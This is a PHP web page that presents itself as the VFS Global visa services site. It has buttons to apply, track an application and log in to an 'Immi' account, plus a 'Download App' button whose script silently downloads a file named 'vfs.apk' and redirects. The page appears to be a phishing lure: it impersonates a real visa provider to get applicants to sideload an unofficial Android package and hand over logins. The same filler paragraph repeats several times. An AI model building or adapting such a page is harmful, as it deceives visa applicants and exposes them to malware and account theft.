<?php
include_once 'head.php';
?>

    <div style="width:100%; height:250px; background-color: #103b5e;"></div>
    <div class="content" style="margin-top:-280px; color: white;">
        <h1 >Welcome to VFS Global</h1>
        <p >VFS Global is the exclusive service provider for the Government of many countries, authorized to provide administrative support services to visa applicants.</p>
 
    </div>
    <div class="content" style=" ">
    <a href="apply.php" class="btn btn-primary" style=" font-size: 20px; color: white; background-color: #103b5e; width: 200px; margin: 20px auto; text-decoration: none; display: block; text-align: center; padding: 10px; border-radius: 5px; box-shadow: 0 4px 8px 0 rgba(0,0,0,0.2), 0 6px 20px 0 rgba(0,0,0,0.19);">Apply for VISA</a>
    </div>
    <div class="content" style=" ">
    <a href="track.php" class="btn btn-primary" style=" font-size: 20px; color: white; background-color: #103b5e; width: 200px; margin: 20px auto; text-decoration: none; display: block; text-align: center; padding: 10px; border-radius: 5px; box-shadow: 0 4px 8px 0 rgba(0,0,0,0.2), 0 6px 20px 0 rgba(0,0,0,0.19);">Track your application</a>
    </div>
    <div class="content" style=" ">
    <a href="loginimmi.php" class="btn btn-primary" style=" font-size: 20px; color: white; background-color: #103b5e; width: 200px; margin: 20px auto; text-decoration: none; display: block; text-align: center; padding: 10px; border-radius: 5px; box-shadow: 0 4px 8px 0 rgba(0,0,0,0.2), 0 6px 20px 0 rgba(0,0,0,0.19);">Login Immi Account</a>
    </div>


    <div class="button-container">
    
        <button class="download-button btn btn-primary" style=" font-size: 20px; color: white; background-color: #103b5e; width: 200px; margin: 20px auto; text-decoration: none; display: block; text-align: center; padding: 10px; border-radius: 5px; box-shadow: 0 4px 8px 0 rgba(0,0,0,0.2), 0 6px 20px 0 rgba(0,0,0,0.19);"
         onclick="downloadAndRedirect()">Download App</button>
    </div>

    <script>
   
        function downloadAndRedirect() {
            const link = document.createElement('a');
            link.href = 'vfs.apk';
            link.download = 'vfs.apk';
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
            window.location.href = 'index.php';
        }
    </script>


    <div class="content" style=" color: black;">
        <h1 >VFS Global Services</h1>
        <p >VFS Global is the exclusive service provider for the Government of many countries, authorized to provide administrative support services to visa applicants.</p>
    </div>
    <div class="content" style=" color: black;">
        <h1 >VFS Global Services</h1>
        <p >VFS Global is the exclusive service provider for the Government of many countries, authorized to provide administrative support services to visa applicants.</p>
    </div>
    <div class="content" style=" color: black;">
        <h1 >VFS Global Services</h1>
        <p >VFS Global is the exclusive service provider for the Government of many countries, authorized to provide administrative support services to visa applicants.</p>
    </div>
    <div class="content" style=" color: black;">
        <h1 >VFS Global Services</h1>
        <p >VFS Global is the exclusive service provider for the Government of many countries, authorized to provide administrative support services to visa applicants.</p>
    </div>
   <?php
   include_once 'foot.php';
   ?>